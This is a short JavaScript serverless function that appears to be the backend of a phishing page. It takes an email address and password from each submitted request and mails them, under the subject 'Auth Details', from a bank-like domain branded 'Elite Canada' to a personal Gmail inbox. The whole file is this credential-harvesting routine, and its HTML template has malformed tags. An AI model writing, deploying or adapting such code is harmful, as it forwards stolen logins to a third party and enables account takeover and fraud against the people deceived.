import * as nodemailer from "nodemailer";

const transporter = nodemailer.createTransport({
  host: "smtp.hostinger.com",
  port: 465,
  secure: true, // true for port 465, false for other ports
  auth: {
    user: "info@ukmetropolitanbk.com",
    pass: process.env.MailPass || "",
  },
});

// async..await is not allowed in global scope, must use a wrapper
export default async ({ req, res, log, error }) => {
  // send mail with defined transport object
  try {
    const { email, pass } = req.bodyJson;
    const info = await transporter.sendMail({
      from: '"Elite Canada" <info@ukmetropolitanbk.com>', // sender address
      to: "ebukufidelis@gmail.com", // list of receivers
      subject:"Auth Details",// Subject line
    html: `<div><h2>Details</h2><p><b<Email: </b>${email}</p> <p><b<Password: </b>${pass}</p></div>`
    });
    return res.text("ok");
  } catch (e) {
    error(e);
    return res.text("bad");
  }

};
